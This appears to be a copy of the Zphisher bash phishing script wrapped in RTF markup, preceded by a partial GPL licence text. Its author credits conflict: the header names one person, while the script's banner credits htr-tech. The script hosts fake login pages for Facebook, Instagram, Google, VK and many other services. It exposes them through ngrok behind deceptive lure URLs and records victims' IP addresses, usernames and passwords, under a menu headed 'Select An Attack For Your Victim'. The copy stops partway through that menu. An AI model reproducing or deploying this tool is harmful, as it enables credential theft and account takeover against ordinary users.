
##   Zphisher \tab : \tab Automated Phishing Tool\par
##   Author \tab : \tab SHAHZAIN DAVID JOIYA\par
##   Version \tab : \tab 2.0\par
##   Github \tab : \tab {{\field{\*\fldinst{HYPERLINK https://github.com/SHAHZAINDAVID005 }}{\fldrslt{https://github.com/SHAHZAINDAVID005\ul0\cf0}}}}\f1\fs22\lang1066\par

## If you Copy Then Give the credits :)\par

##                   GNU GENERAL PUBLIC LICENSE\par
##                    Version 3, 29 June 2007\par
##\par
##    Copyright (C) 2007 Free Software Foundation, Inc. <{{\field{\*\fldinst{HYPERLINK "https://fsf.org/"}}{\fldrslt{https://fsf.org/\ul0\cf0}}}}\f1\fs22 >\par
##    Everyone is permitted to copy and distribute verbatim copies\par
##    of this license document, but changing it is not allowed.\par
##\par
##                         Preamble\par
##\par
##    The GNU General Public License is a free, copyleft license for\par
##    software and other kinds of works.\par
##\par
##    The licenses for most software and other practical works are designed\par
##    to take away your freedom to share and change the works.  By contrast,\par
##    the GNU General Public License is intended to guarantee your freedom to\par
##    share and change all versions of a program--to make sure it remains free\par
##    software for all its users.  We, the Free Software Foundation, use the\par
##    GNU General Public License for most of our software; it applies also to\par
##    any other work released this way by its authors.  You can apply it to\par
##    your programs, too.\par
##\par
##    When we speak of free software, we are referring to freedom, not\par
##    price.  Our General Public Licenses are designed to make sure that you\par
##    have the freedom to distribute copies of free software (and charge for\par
##    them if you wish), that you receive source code or can get it if you\par
##    want it, that you can change the software or use pieces of it in new\par
##    free programs, and that you know you can do these things.\par
##\par
##    To protect your rights, we need to prevent others from denying you\par
##    these rights or asking you to surrender the rights.  Therefore, you have\par
##    certain responsibilities if you distribute copies of the software, or if\par
##    you modify it: responsibilities to respect the freedom of others.\par
##\par
##    For example, if you distribute copies of such a program, whether\par
##    gratis or for a fee, you must pass on to the recipients the same\par
##    freedoms that you received.  You must make sure that they, too, receive\par
##    or can get the source code.  And you must show them these terms so they\par
##    know their rights.\par
##\par
##    Developers that use the GNU GPL protect your rights with two steps:\par
##    (1) assert copyright on the software, and (2) offer you this License\par
##    giving you legal permission to copy, distribute and/or modify it.\par
##\par
##    For the developers' and authors' protection, the GPL clearly explains\par
##    that there is no warranty for this free software.  For both users' and\par
##    authors' sake, the GPL requires that modified versions be marked as\par
##    changed, so that their problems will not be attributed erroneously to\par
##    authors of previous versions.\par
##\par
##    Some devices are designed to deny users access to install or run\par
##    modified versions of the software inside them, although the manufacturer\par
##    can do so.  This is fundamentally incompatible with the aim of\par
##    protecting users' freedom to change the software.  The systematic\par
##    pattern of such abuse occurs in the area of products for individuals to\par
##    use, which is precisely where it is most unacceptable.  Therefore, we\par
\par
\par
## Directories\par
if [[ ! -d ".server" ]]; then\par
\tab mkdir -p ".server"\par
fi\par
if [[ -d ".server/www" ]]; then\par
\tab rm -rf ".server/www"\par
\tab mkdir -p ".server/www"\par
else\par
\tab mkdir -p ".server/www"\par
fi\par
\par
## Script termination\par
exit_on_signal_SIGINT() \{\par
    \{ printf "\\n\\n%s\\n\\n" "$\{RED\}[$\{WHITE\}!$\{RED\}]$\{RED\} Program Interrupted." 2>&1; reset_color; \}\par
    exit 0\par
\}\par
\par
exit_on_signal_SIGTERM() \{\par
    \{ printf "\\n\\n%s\\n\\n" "$\{RED\}[$\{WHITE\}!$\{RED\}]$\{RED\} Program Terminated." 2>&1; reset_color; \}\par
    exit 0\par
\}\par
\par
trap exit_on_signal_SIGINT SIGINT\par
trap exit_on_signal_SIGTERM SIGTERM\par
\par
## Reset terminal colors\par
reset_color() \{\par
\tab tput sgr0   # reset attributes\par
\tab tput op     # reset color\par
    return\par
\}\par
\par
## Kill already running process\par
kill_pid() \{\par
\tab if [[ `pidof php` ]]; then\par
\tab\tab killall php > /dev/null 2>&1\par
\tab fi\par
\tab if [[ `pidof ngrok` || `pidof ngrok2` ]]; then\par
\tab\tab killall ngrok > /dev/null 2>&1 || killall ngrok2 > /dev/null 2>&1\par
\tab fi\tab\par
\}\par
\par
## Banner\par
banner() \{\par
\tab cat <<- EOF\par
\tab\tab $\{ORANGE\}\par
\tab\tab $\{ORANGE\} ______      _     _     _               \par
\tab\tab $\{ORANGE\}|___  /     | |   (_)   | |              \par
\tab\tab $\{ORANGE\}   / / _ __ | |__  _ ___| |__   ___ _ __ \par
\tab\tab $\{ORANGE\}  / / | '_ \\| '_ \\| / __| '_ \\ / _ \\ '__|\par
\tab\tab $\{ORANGE\} / /__| |_) | | | | \\__ \\ | | |  __/ |   \par
\tab\tab $\{ORANGE\}/_____| .__/|_| |_|_|___/_| |_|\\___|_|   \par
\tab\tab $\{ORANGE\}      | |                                \par
\tab\tab $\{ORANGE\}      |_|                $\{RED\}Version : 2.1\par
\tab\tab $\{GREEN\}[$\{WHITE\}-$\{GREEN\}]$\{CYAN\} Tool Created by htr-tech (tahmid.rayat)$\{WHITE\}\par
\tab EOF\par
\}\par
\par
## Small Banner\par
banner_small() \{\par
\tab cat <<- EOF\par
\tab\tab $\{BLUE\}\par
\tab\tab $\{BLUE\}  \f2\u9617?\u9600?\u9600?\u9608?\u9617?\u9608?\u9600?\u9608?\u9617?\u9608?\u9617?\u9608?\u9617?\u9600?\u9608?\u9600?\u9617?\u9608?\u9600?\u9600?\u9617?\u9608?\u9617?\u9608?\u9617?\u9608?\u9600?\u9600?\u9617?\u9608?\u9600?\u9604?\f0\lang1033\par
\tab\tab $\{BLUE\}  \f2\u9617?\u9604?\u9600?\u9617?\u9617?\u9608?\u9600?\u9600?\u9617?\u9608?\u9600?\u9608?\u9617?\u9617?\u9608?\u9617?\u9617?\u9600?\u9600?\u9608?\u9617?\u9608?\u9600?\u9608?\u9617?\u9608?\u9600?\u9600?\u9617?\u9608?\u9600?\u9604?\f0\par
\tab\tab $\{BLUE\}  \f2\u9617?\u9600?\u9600?\u9600?\u9617?\u9600?\u9617?\u9617?\u9617?\u9600?\u9617?\u9600?\u9617?\u9600?\u9600?\u9600?\u9617?\u9600?\u9600?\u9600?\u9617?\u9600?\u9617?\u9600?\u9617?\u9600?\u9600?\u9600?\u9617?\u9600?\u9617?\u9600?\f0 $\{WHITE\} 2.1\par
\tab EOF\par
\}\par
\par
## Dependencies\par
dependencies() \{\par
\tab echo -e "\\n$\{GREEN\}[$\{WHITE\}+$\{GREEN\}]$\{CYAN\} Installing required packages..."\par
\tab if [[ `command -v php` && `command -v wget` && `command -v curl` && `command -v unzip` ]]; then\par
\tab\tab echo -e "\\n$\{GREEN\}[$\{WHITE\}+$\{GREEN\}]$\{GREEN\} Packages already installed."\par
\tab else\par
\tab\tab pkgs=(php curl wget unzip)\par
\tab\tab for pkg in "$\{pkgs[@]\}"; do\par
\tab\tab\tab type -p "$pkg" &>/dev/null || \{\par
\tab\tab\tab\tab echo -e "\\n$\{GREEN\}[$\{WHITE\}+$\{GREEN\}]$\{CYAN\} Installing packages : $\{ORANGE\}$pkg$\{CYAN\}"$\{WHITE\}\par
\tab\tab\tab\tab if [[ `command -v pkg` ]]; then\par
\tab\tab\tab\tab\tab pkg install "$pkg"\par
\tab\tab\tab\tab elif [[ `command -v apt` ]]; then\par
\tab\tab\tab\tab\tab apt install "$pkg" -y\par
\tab\tab\tab\tab elif [[ `command -v apt-get` ]]; then\par
\tab\tab\tab\tab\tab apt-get install "$pkg" -y\par
\tab\tab\tab\tab elif [[ `command -v pacman` ]]; then\par
\tab\tab\tab\tab\tab sudo pacman -S "$pkg" --noconfirm\par
\tab\tab\tab\tab elif [[ `command -v dnf` ]]; then\par
\tab\tab\tab\tab\tab sudo dnf -y install "$pkg"\par
\tab\tab\tab\tab else\par
\tab\tab\tab\tab\tab echo -e "\\n$\{RED\}[$\{WHITE\}!$\{RED\}]$\{RED\} Unsupported package manager, Install packages manually."\par
\tab\tab\tab\tab\tab\{ reset_color; exit 1; \}\par
\tab\tab\tab\tab fi\par
\tab\tab\tab\}\par
\tab\tab done\par
\tab fi\par
\}\par
\par
## Download Ngrok\par
download_ngrok() \{\par
\tab url="$1"\par
\tab file=`basename $url`\par
\tab if [[ -e "$file" ]]; then\par
\tab\tab rm -rf "$file"\par
\tab fi\par
\tab wget --no-check-certificate "$url" > /dev/null 2>&1\par
\tab if [[ -e "$file" ]]; then\par
\tab\tab unzip "$file" > /dev/null 2>&1\par
\tab\tab mv -f ngrok .server/"$2" > /dev/null 2>&1\par
\tab\tab rm -rf "$file" > /dev/null 2>&1\par
\tab\tab chmod +x .server/"$2" > /dev/null 2>&1\par
\tab else\par
\tab\tab echo -e "\\n$\{RED\}[$\{WHITE\}!$\{RED\}]$\{RED\} Error occured, Install Ngrok manually."\par
\tab\tab\{ reset_color; exit 1; \}\par
\tab fi\par
\}\par
\par
## Install ngrok\par
install_ngrok() \{\par
\tab if [[ -e ".server/ngrok" ]]; then\par
\tab\tab echo -e "\\n$\{GREEN\}[$\{WHITE\}+$\{GREEN\}]$\{GREEN\} Ngrok already installed."\par
\tab else\par
\tab\tab echo -e "\\n$\{GREEN\}[$\{WHITE\}+$\{GREEN\}]$\{CYAN\} Installing ngrok..."$\{WHITE\}\par
\tab\tab arch=`uname -m`\par
\tab\tab if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then\par
\tab\tab\tab download_ngrok '{{\field{\*\fldinst{HYPERLINK https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip }}{\fldrslt{https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip\ul0\cf0}}}}\f0\fs22 ' 'ngrok'\par
\tab\tab elif [[ "$arch" == *'aarch64'* ]]; then\par
\tab\tab\tab download_ngrok '{{\field{\*\fldinst{HYPERLINK https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm64.zip }}{\fldrslt{https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm64.zip\ul0\cf0}}}}\f0\fs22 ' 'ngrok'\par
\tab\tab elif [[ "$arch" == *'x86_64'* ]]; then\par
\tab\tab\tab download_ngrok '{{\field{\*\fldinst{HYPERLINK https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip }}{\fldrslt{https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip\ul0\cf0}}}}\f0\fs22 ' 'ngrok'\par
\tab\tab else\par
\tab\tab\tab download_ngrok '{{\field{\*\fldinst{HYPERLINK https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip }}{\fldrslt{https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip\ul0\cf0}}}}\f0\fs22 ' 'ngrok'\par
\tab\tab fi\par
\tab fi\par
\par
\tab if [[ -e ".server/ngrok2" ]]; then\par
\tab\tab echo -e "\\n$\{GREEN\}[$\{WHITE\}+$\{GREEN\}]$\{GREEN\} Ngrok patch already installed."\par
\tab else\par
\tab\tab echo -e "\\n$\{GREEN\}[$\{WHITE\}+$\{GREEN\}]$\{CYAN\} Installing ngrok patch..."$\{WHITE\}\par
\tab\tab arch=`uname -m`\par
\tab\tab if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then\par
\tab\tab\tab download_ngrok '{{\field{\*\fldinst{HYPERLINK https://bin.equinox.io/a/e93TBaoFgZw/ngrok-2.2.8-linux-arm.zip }}{\fldrslt{https://bin.equinox.io/a/e93TBaoFgZw/ngrok-2.2.8-linux-arm.zip\ul0\cf0}}}}\f0\fs22 ' 'ngrok2'\par
\tab\tab elif [[ "$arch" == *'aarch64'* ]]; then\par
\tab\tab\tab download_ngrok '{{\field{\*\fldinst{HYPERLINK https://bin.equinox.io/a/nmkK3DkqZEB/ngrok-2.2.8-linux-arm64.zip }}{\fldrslt{https://bin.equinox.io/a/nmkK3DkqZEB/ngrok-2.2.8-linux-arm64.zip\ul0\cf0}}}}\f0\fs22 ' 'ngrok2'\par
\tab\tab elif [[ "$arch" == *'x86_64'* ]]; then\par
\tab\tab\tab download_ngrok '{{\field{\*\fldinst{HYPERLINK https://bin.equinox.io/a/kpRGfBMYeTx/ngrok-2.2.8-linux-amd64.zip }}{\fldrslt{https://bin.equinox.io/a/kpRGfBMYeTx/ngrok-2.2.8-linux-amd64.zip\ul0\cf0}}}}\f0\fs22 ' 'ngrok2'\par
\tab\tab else\par
\tab\tab\tab download_ngrok '{{\field{\*\fldinst{HYPERLINK https://bin.equinox.io/a/4hREUYJSmzd/ngrok-2.2.8-linux-386.zip }}{\fldrslt{https://bin.equinox.io/a/4hREUYJSmzd/ngrok-2.2.8-linux-386.zip\ul0\cf0}}}}\f0\fs22 ' 'ngrok2'\par
\tab\tab fi\par
\tab fi\par
\}\par
\par
## Exit message\par
msg_exit() \{\par
\tab\{ clear; banner; echo; \}\par
\tab echo -e "$\{GREENBG\}$\{BLACK\} Thank you for using this tool. Have a good day.$\{RESETBG\}\\n"\par
\tab\{ reset_color; exit 0; \}\par
\}\par
\par
## About\par
about() \{\par
\tab\{ clear; banner; echo; \}\par
\tab cat <<- EOF\par
\tab\tab $\{GREEN\}Author   $\{RED\}:  $\{ORANGE\}TAHMID RAYAT $\{RED\}[ $\{ORANGE\}HTR-TECH $\{RED\}]\par
\tab\tab $\{GREEN\}Github   $\{RED\}:  $\{CYAN\}https://github.com/htr-tech\par
\tab\tab $\{GREEN\}Social   $\{RED\}:  $\{CYAN\}https://linktr.ee/tahmid.rayat\par
\tab\tab $\{GREEN\}Version  $\{RED\}:  $\{ORANGE\}2.1\par
\tab\tab $\{REDBG\}$\{WHITE\} Thanks : Adi1090x,MoisesTapia,DarkSecDevelopers,Thelinuxchoice $\{RESETBG\}\par
\tab\tab $\{RED\}[$\{WHITE\}00$\{RED\}]$\{ORANGE\} Main Menu     $\{RED\}[$\{WHITE\}99$\{RED\}]$\{ORANGE\} Exit\par
\tab EOF\par
\par
\tab read -p "$\{RED\}[$\{WHITE\}-$\{RED\}]$\{GREEN\} Select an option : $\{BLUE\}"\par
\par
\tab if [[ "$REPLY" == 99 ]]; then\par
\tab\tab msg_exit\par
\tab elif [[ "$REPLY" == 0 || "$REPLY" == 00 ]]; then\par
\tab\tab echo -ne "\\n$\{GREEN\}[$\{WHITE\}+$\{GREEN\}]$\{CYAN\} Returning to main menu..."\par
\tab\tab\{ sleep 1; main_menu; \}\par
\tab else\par
\tab\tab echo -ne "\\n$\{RED\}[$\{WHITE\}!$\{RED\}]$\{RED\} Invalid Option, Try Again..."\par
\tab\tab\{ sleep 1; about; \}\par
\tab fi\par
\}\par
\par
## Setup website and start php server\par
HOST='127.0.0.1'\par
PORT='8080'\par
\par
setup_site() \{\par
\tab echo -e "\\n$\{RED\}[$\{WHITE\}-$\{RED\}]$\{BLUE\} Setting up server..."$\{WHITE\}\par
\tab cp -rf .sites/"$website"/* .server/www\par
\tab cp -f .sites/ip.php .server/www/\par
\tab echo -ne "\\n$\{RED\}[$\{WHITE\}-$\{RED\}]$\{BLUE\} Starting PHP server..."$\{WHITE\}\par
\tab cd .server/www && php -S "$HOST":"$PORT" > /dev/null 2>&1 & \par
\}\par
\par
## Get IP address\par
capture_ip() \{\par
\tab IP=$(grep -a 'IP:' .server/www/ip.txt | cut -d " " -f2 | tr -d '\\r')\par
\tab IFS=$'\\n'\par
\tab echo -e "\\n$\{RED\}[$\{WHITE\}-$\{RED\}]$\{GREEN\} Victim's IP : $\{BLUE\}$IP"\par
\tab echo -ne "\\n$\{RED\}[$\{WHITE\}-$\{RED\}]$\{BLUE\} Saved in : $\{ORANGE\}ip.txt"\par
\tab cat .server/www/ip.txt >> ip.txt\par
\}\par
\par
## Get credentials\par
capture_creds() \{\par
\tab ACCOUNT=$(grep -o 'Username:.*' .server/www/usernames.txt | cut -d " " -f2)\par
\tab PASSWORD=$(grep -o 'Pass:.*' .server/www/usernames.txt | cut -d ":" -f2)\par
\tab IFS=$'\\n'\par
\tab echo -e "\\n$\{RED\}[$\{WHITE\}-$\{RED\}]$\{GREEN\} Account : $\{BLUE\}$ACCOUNT"\par
\tab echo -e "\\n$\{RED\}[$\{WHITE\}-$\{RED\}]$\{GREEN\} Password : $\{BLUE\}$PASSWORD"\par
\tab echo -e "\\n$\{RED\}[$\{WHITE\}-$\{RED\}]$\{BLUE\} Saved in : $\{ORANGE\}usernames.dat"\par
\tab cat .server/www/usernames.txt >> usernames.dat\par
\tab echo -ne "\\n$\{RED\}[$\{WHITE\}-$\{RED\}]$\{ORANGE\} Waiting for Next Login Info, $\{BLUE\}Ctrl + C $\{ORANGE\}to exit. "\par
\}\par
\par
## Print data\par
capture_data() \{\par
\tab echo -ne "\\n$\{RED\}[$\{WHITE\}-$\{RED\}]$\{ORANGE\} Waiting for Login Info, $\{BLUE\}Ctrl + C $\{ORANGE\}to exit..."\par
\tab while true; do\par
\tab\tab if [[ -e ".server/www/ip.txt" ]]; then\par
\tab\tab\tab echo -e "\\n\\n$\{RED\}[$\{WHITE\}-$\{RED\}]$\{GREEN\} Victim IP Found !"\par
\tab\tab\tab capture_ip\par
\tab\tab\tab rm -rf .server/www/ip.txt\par
\tab\tab fi\par
\tab\tab sleep 0.75\par
\tab\tab if [[ -e ".server/www/usernames.txt" ]]; then\par
\tab\tab\tab echo -e "\\n\\n$\{RED\}[$\{WHITE\}-$\{RED\}]$\{GREEN\} Login info Found !!"\par
\tab\tab\tab capture_creds\par
\tab\tab\tab rm -rf .server/www/usernames.txt\par
\tab\tab fi\par
\tab\tab sleep 0.75\par
\tab done\par
\}\par
\par
## Start ngrok\par
start_ngrok() \{\par
\tab echo -e "\\n$\{RED\}[$\{WHITE\}-$\{RED\}]$\{GREEN\} Initializing... $\{GREEN\}( $\{CYAN\}http://$HOST:$PORT $\{GREEN\})"\par
\tab\{ sleep 1; setup_site; \}\par
\tab echo -ne "\\n\\n$\{RED\}[$\{WHITE\}-$\{RED\}]$\{GREEN\} $2"\par
\tab sleep 2 && ./.server/"$1" http "$HOST":"$PORT" > /dev/null 2>&1 &\par
\tab\{ sleep 8; clear; banner_small; \}\par
\tab ngrok_url=$(curl -s -N {{\field{\*\fldinst{HYPERLINK http://127.0.0.1:4040/api/tunnels }}{\fldrslt{http://127.0.0.1:4040/api/tunnels\ul0\cf0}}}}\f0\fs22  | grep -o "{{\field{\*\fldinst{HYPERLINK https://[0-9a-z]*\\\\.ngrok.io }}{\fldrslt{https://[0-9a-z]*\\.ngrok.io\ul0\cf0}}}}\f0\fs22 ")\par
\tab ngrok_url1=$\{ngrok_url#https://\}\par
\tab echo -e "\\n$\{RED\}[$\{WHITE\}-$\{RED\}]$\{BLUE\} URL 1 : $\{GREEN\}$ngrok_url"\par
\tab echo -e "\\n$\{RED\}[$\{WHITE\}-$\{RED\}]$\{BLUE\} URL 2 : $\{GREEN\}$mask@$ngrok_url1"\par
\tab capture_data\par
\}\par
\par
## Start localhost\par
start_localhost() \{\par
\tab echo -e "\\n$\{RED\}[$\{WHITE\}-$\{RED\}]$\{GREEN\} Initializing... $\{GREEN\}( $\{CYAN\}http://$HOST:$PORT $\{GREEN\})"\par
\tab setup_site\par
\tab\{ sleep 1; clear; banner_small; \}\par
\tab echo -e "\\n$\{RED\}[$\{WHITE\}-$\{RED\}]$\{GREEN\} Successfully Hosted at : $\{GREEN\}$\{CYAN\}http://$HOST:$PORT $\{GREEN\}"\par
\tab capture_data\par
\}\par
\par
## Tunnel selection\par
tunnel_menu() \{\par
\tab\{ clear; banner_small; \}\par
\tab cat <<- EOF\par
\tab\tab $\{RED\}[$\{WHITE\}01$\{RED\}]$\{ORANGE\} Localhost $\{RED\}[$\{CYAN\}For Devs Only$\{RED\}]\par
\tab\tab $\{RED\}[$\{WHITE\}02$\{RED\}]$\{ORANGE\} Ngrok.io  $\{RED\}[$\{CYAN\}Hotspot Required$\{RED\}]\par
\tab\tab $\{RED\}[$\{WHITE\}03$\{RED\}]$\{ORANGE\} Ngrok.io  $\{RED\}[$\{CYAN\}Without Hotspot$\{RED\}]\par
\tab EOF\par
\par
\tab read -p "$\{RED\}[$\{WHITE\}-$\{RED\}]$\{GREEN\} Select a port forwarding service : $\{BLUE\}"\par
\par
\tab if [[ "$REPLY" == 1 || "$REPLY" == 01 ]]; then\par
\tab\tab start_localhost\par
\tab elif [[ "$REPLY" == 2 || "$REPLY" == 02 ]]; then\par
\tab\tab start_ngrok "ngrok" "Launching Ngrok... Turn on Hotspot..."\par
\tab elif [[ "$REPLY" == 3 || "$REPLY" == 03 ]]; then\par
\tab\tab start_ngrok "ngrok2" "Launching Ngrok Patched..."\par
\tab else\par
\tab\tab echo -ne "\\n$\{RED\}[$\{WHITE\}!$\{RED\}]$\{RED\} Invalid Option, Try Again..."\par
\tab\tab\{ sleep 1; tunnel_menu; \}\par
\tab fi\par
\}\par
\par
## Facebook\par
site_facebook() \{\par
\tab cat <<- EOF\par
\tab\tab $\{RED\}[$\{WHITE\}01$\{RED\}]$\{ORANGE\} Traditional Login Page\par
\tab\tab $\{RED\}[$\{WHITE\}02$\{RED\}]$\{ORANGE\} Advanced Voting Poll Login Page\par
\tab\tab $\{RED\}[$\{WHITE\}03$\{RED\}]$\{ORANGE\} Fake Security Login Page\par
\tab\tab $\{RED\}[$\{WHITE\}04$\{RED\}]$\{ORANGE\} Facebook Messenger Login Page\par
\tab EOF\par
\par
\tab read -p "$\{RED\}[$\{WHITE\}-$\{RED\}]$\{GREEN\} Select an option : $\{BLUE\}"\par
\par
\tab if [[ "$REPLY" == 1 || "$REPLY" == 01 ]]; then\par
\tab\tab website="facebook"\par
\tab\tab mask='http://blue-verified-badge-for-facebook-free'\par
\tab\tab tunnel_menu\par
\tab elif [[ "$REPLY" == 2 || "$REPLY" == 02 ]]; then\par
\tab\tab website="fb_advanced"\par
\tab\tab mask='http://vote-for-the-best-social-media'\par
\tab\tab tunnel_menu\par
\tab elif [[ "$REPLY" == 3 || "$REPLY" == 03 ]]; then\par
\tab\tab website="fb_security"\par
\tab\tab mask='http://make-your-facebook-secured-and-free-from-hackers'\par
\tab\tab tunnel_menu\par
\tab elif [[ "$REPLY" == 4 || "$REPLY" == 04 ]]; then\par
\tab\tab website="fb_messenger"\par
\tab\tab mask='http://get-messenger-premium-features-free'\par
\tab\tab tunnel_menu\par
\tab else\par
\tab\tab echo -ne "\\n$\{RED\}[$\{WHITE\}!$\{RED\}]$\{RED\} Invalid Option, Try Again..."\par
\tab\tab\{ sleep 1; clear; banner_small; site_facebook; \}\par
\tab fi\par
\}\par
\par
## Instagram\par
site_instagram() \{\par
\tab cat <<- EOF\par
\tab\tab $\{RED\}[$\{WHITE\}01$\{RED\}]$\{ORANGE\} Traditional Login Page\par
\tab\tab $\{RED\}[$\{WHITE\}02$\{RED\}]$\{ORANGE\} Auto Followers Login Page\par
\tab\tab $\{RED\}[$\{WHITE\}03$\{RED\}]$\{ORANGE\} 1000 Followers Login Page\par
\tab\tab $\{RED\}[$\{WHITE\}04$\{RED\}]$\{ORANGE\} Blue Badge Verify Login Page\par
\tab EOF\par
\par
\tab read -p "$\{RED\}[$\{WHITE\}-$\{RED\}]$\{GREEN\} Select an option : $\{BLUE\}"\par
\par
\tab if [[ "$REPLY" == 1 || "$REPLY" == 01 ]]; then\par
\tab\tab website="instagram"\par
\tab\tab mask='http://get-unlimited-followers-for-instagram'\par
\tab\tab tunnel_menu\par
\tab elif [[ "$REPLY" == 2 || "$REPLY" == 02 ]]; then\par
\tab\tab website="ig_followers"\par
\tab\tab mask='http://get-unlimited-followers-for-instagram'\par
\tab\tab tunnel_menu\par
\tab elif [[ "$REPLY" == 3 || "$REPLY" == 03 ]]; then\par
\tab\tab website="insta_followers"\par
\tab\tab mask='http://get-1000-followers-for-instagram'\par
\tab\tab tunnel_menu\par
\tab elif [[ "$REPLY" == 4 || "$REPLY" == 04 ]]; then\par
\tab\tab website="ig_verify"\par
\tab\tab mask='http://blue-badge-verify-for-instagram-free'\par
\tab\tab tunnel_menu\par
\tab else\par
\tab\tab echo -ne "\\n$\{RED\}[$\{WHITE\}!$\{RED\}]$\{RED\} Invalid Option, Try Again..."\par
\tab\tab\{ sleep 1; clear; banner_small; site_instagram; \}\par
\tab fi\par
\}\par
\par
## Gmail/Google\par
site_gmail() \{\par
\tab cat <<- EOF\par
\tab\tab $\{RED\}[$\{WHITE\}01$\{RED\}]$\{ORANGE\} Gmail Old Login Page\par
\tab\tab $\{RED\}[$\{WHITE\}02$\{RED\}]$\{ORANGE\} Gmail New Login Page\par
\tab\tab $\{RED\}[$\{WHITE\}03$\{RED\}]$\{ORANGE\} Advanced Voting Poll\par
\tab EOF\par
\par
\tab read -p "$\{RED\}[$\{WHITE\}-$\{RED\}]$\{GREEN\} Select an option : $\{BLUE\}"\par
\par
\tab if [[ "$REPLY" == 1 || "$REPLY" == 01 ]]; then\par
\tab\tab website="google"\par
\tab\tab mask='http://get-unlimited-google-drive-free'\par
\tab\tab tunnel_menu\par
\tab elif [[ "$REPLY" == 2 || "$REPLY" == 02 ]]; then\par
\tab\tab website="google_new"\par
\tab\tab mask='http://get-unlimited-google-drive-free'\par
\tab\tab tunnel_menu\par
\tab elif [[ "$REPLY" == 3 || "$REPLY" == 03 ]]; then\par
\tab\tab website="google_poll"\par
\tab\tab mask='http://vote-for-the-best-social-media'\par
\tab\tab tunnel_menu\par
\tab else\par
\tab\tab echo -ne "\\n$\{RED\}[$\{WHITE\}!$\{RED\}]$\{RED\} Invalid Option, Try Again..."\par
\tab\tab\{ sleep 1; clear; banner_small; site_gmail; \}\par
\tab fi\par
\}\par
\par
## Vk\par
site_vk() \{\par
\tab cat <<- EOF\par
\tab\tab $\{RED\}[$\{WHITE\}01$\{RED\}]$\{ORANGE\} Traditional Login Page\par
\tab\tab $\{RED\}[$\{WHITE\}02$\{RED\}]$\{ORANGE\} Advanced Voting Poll Login Page\par
\tab EOF\par
\par
\tab read -p "$\{RED\}[$\{WHITE\}-$\{RED\}]$\{GREEN\} Select an option : $\{BLUE\}"\par
\par
\tab if [[ "$REPLY" == 1 || "$REPLY" == 01 ]]; then\par
\tab\tab website="vk"\par
\tab\tab mask='http://vk-premium-real-method-2020'\par
\tab\tab tunnel_menu\par
\tab elif [[ "$REPLY" == 2 || "$REPLY" == 02 ]]; then\par
\tab\tab website="vk_poll"\par
\tab\tab mask='http://vote-for-the-best-social-media'\par
\tab\tab tunnel_menu\par
\tab else\par
\tab\tab echo -ne "\\n$\{RED\}[$\{WHITE\}!$\{RED\}]$\{RED\} Invalid Option, Try Again..."\par
\tab\tab\{ sleep 1; clear; banner_small; site_vk; \}\par
\tab fi\par
\}\par
\par
## Menu\par
main_menu() \{\par
\tab\{ clear; banner; echo; \}\par
\tab cat <<- EOF\par
\tab\tab $\{RED\}[$\{WHITE\}::$\{RED\}]$\{ORANGE\} Select An Attack For Your Victim $\{RED\}[$\{WHITE\}::$\{RED\}]$\{ORANGE\}\par
\tab\tab $\{RED\}[$\{WHITE\}01$\{RED\}]$\{ORANGE\} Facebook      $\{RED\}[$\{WHITE\}11$\{RED\}]$\{ORANGE\} Twitch       $\{RED\}[$\{WHITE\}21$\{RED\}]$\{ORANGE\} DeviantArt\par
\tab\tab $\{RED\}[$\{WHITE\}02$\{RED\}]$\{ORANGE\} Instagram     $\{RED\}[$\{WHITE\}12$\{RED\}]$\{ORANGE\} Pinterest    $\{RED\}[$\{WHITE\}22$\{RED\}]$\{ORANGE\} Badoo\par
\tab\tab $\{RED\}[$\{WHITE\}03$\{RED\}]$\{ORANGE\} Google        $\{RED\}[$\{WHITE\}13$\{RED\}]$\{ORANGE\} Snapchat     $\{RED\}[$\{WHITE\}23$\{RED\}]$\{ORANGE\} Origin\par
\tab\tab $\{RED\}[$\{WHITE\}04$\{RED\}]$\{ORANGE\} Microsoft     $\{RED\}[$\{WHITE\}14$\{RED\}]$\{ORANGE\} Linkedin     $\{RED\}[$\{WHITE\}24$\{RED\}]$\{ORANGE\} DropBox\tab\par
\tab\tab $\{RED\}[$\{WHITE\}05$\{RED\}]$\{ORANGE\} Netflix       $\{RED\}[$\{WHITE\}15$\{RED\}]$\{ORANGE\} Ebay         $\{RED\}[$\{WHITE\}25$\{RED\}]$\{ORANGE\} Yahoo\tab\tab\par
\tab\tab $\{RED\}[$\{WHITE\}06$\{RED\}]$\{ORANGE\} Paypal        $\{RED\}[$\{WHITE\}16$\{RED\}]$\{ORANGE\} Quora        $\{RED\}[$\{WHITE\}26$\{RED\}]$\{ORANGE\} Wordpress\par
\tab\tab $\{RED\}[$\{WHITE\}07$\{RED\}]$\{ORANGE\} Steam         $\{RED\}[$\{WHITE\}17$\{RED\}]$\{ORANGE\} Protonmail   $\{RED\}[$\{WHITE\}27$\{RED\}]$\{ORANGE\} Yandex\tab\tab\tab\par
\tab\tab $\{RED\}[$\{WHITE\}08$\{RED\}]$\{ORANGE\} Twitter       $\{RED\}[$\{WHITE\}18$\{RED\}]$\{ORANGE\} Spotify      $\{RED\}[$\{WHITE\}28$\{RED\}]$\{ORANGE\} StackoverFlow\par
\tab\tab $\{RED\}[$\{WHITE\}09$\{RED\}]$\{ORANGE\} Playstation   $\{RED\}[$\{WHITE\}19$\{RED\}]$\{ORANGE\} Reddit       $\{RED\}[$\{WHITE\}29$\{RED\}]$\{ORANGE\} Vk\par
\tab\tab $\{RED\}[$\{WHITE\}10$\{RED\}]$\{ORANGE\} Tiktok        $\{RED\}[$\{WHITE\}20$\{RED\}]$\{ORANGE\} Adobe        $\{RED\}[$\{WHITE\}30$\{RED\}]$\{ORANGE\} XBOX\par
\tab\tab $\{RED\}[$\{WHITE\}99$\{RED\}]$\{ORANGE\} About         $\{RED\}[$\{WHITE\}00$\{RED\}]$\{ORANGE\} Exit\par
\tab EOF\par
\tab\par
